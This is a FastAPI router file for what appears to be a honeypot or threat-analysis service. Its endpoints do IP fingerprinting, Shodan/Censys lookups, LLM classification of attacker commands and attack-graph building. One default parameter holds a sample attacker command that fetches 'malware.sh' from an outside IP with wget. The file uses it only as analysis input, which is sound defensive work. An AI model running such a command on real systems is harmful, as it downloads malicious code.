from typing import Optional
from fastapi import APIRouter, Query, Body
from pydantic import BaseModel

from app.utils.fingerprint_service import analyze_ip_fingerprint
from app.utils.external_recon_service import query_shodan_censys_footprint
from app.ml.semantic_engine import semantic_analyze_command, generate_attack_correlation_graph

router = APIRouter(prefix="/recon", tags=["Advanced Recon & Fingerprinting"])

class SemanticAnalyzeRequest(BaseModel):
    command: str
    ip: Optional[str] = "185.220.101.5"
    protocol: Optional[str] = "SSH"

@router.get("/fingerprint/{ip}")
def get_ip_fingerprint(ip: str, protocol: str = Query("SSH")):
    """
    Returns JA3/JA3S TLS fingerprint, p0f TCP stack OS estimation, and Zeek DPI telemetry.
    """
    return analyze_ip_fingerprint(ip, protocol)

@router.get("/shodan/{ip}")
def get_shodan_censys_recon(ip: str):
    """
    Returns active Shodan/Censys open ports, banners, BGP routing provenance, and Passive DNS DGA score.
    """
    return query_shodan_censys_footprint(ip)

@router.post("/semantic-analyze")
def analyze_command_semantics(req: SemanticAnalyzeRequest):
    """
    Llama 3 Semantic Intent Classification, NLP Entity Extraction, and Kill Chain Prediction.
    """
    return semantic_analyze_command(req.command, {"ip": req.ip, "protocol": req.protocol})

@router.get("/attack-graph/{event_id}")
def get_attack_correlation_graph(event_id: int, ip: str = Query("185.220.101.5"), cmd: str = Query("wget http://185.220.101.5/malware.sh")):
    """
    Returns nodes and edges for Interactive Attack Chain & Correlation Graph visualization.
    """
    return generate_attack_correlation_graph({"id": event_id, "ip": ip, "cmd": cmd, "protocol": "SSH"})
